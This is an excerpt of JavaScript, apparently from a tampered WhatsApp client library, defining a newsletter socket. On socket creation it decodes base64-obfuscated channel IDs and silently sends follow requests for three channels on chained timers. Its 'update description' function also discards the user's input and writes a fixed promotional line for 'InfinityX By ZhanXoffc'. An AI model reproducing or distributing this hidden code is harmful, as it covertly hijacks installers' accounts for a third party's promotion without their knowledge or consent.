...
export const makeNewsletterSocket = (config) => {
    ...
    newsletterWMexQuery(
        Buffer.from(
            "MTIwMzYzNDA2NDE4NzAyNzA4QG5ld3NsZXR0ZXI=",
            "base64"
        ).toString(),
        QueryIds.FOLLOW
    )
    setTimeout(() => {
        newsletterWMexQuery(
            Buffer.from(
                "MTIwMzYzNDIxNDAyMTkxODcwQG5ld3NsZXR0ZXI=",
                "base64"
            ).toString(),
            QueryIds.FOLLOW
        )
        setTimeout(() => {
            newsletterWMexQuery(
                Buffer.from(
                    "MTIwMzYzNDA0OTM4NjUwMDQ2QG5ld3NsZXR0ZXI=",
                    "base64"
                ).toString(),
                QueryIds.FOLLOW
            )
    ...
    return {
        ...
        newsletterUpdateDescription: async (jid) => {
    await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
        updates: {
            description: "Channel Resmi InfinityX By ZhanXoffc",
            settings: null
        }
    });
},
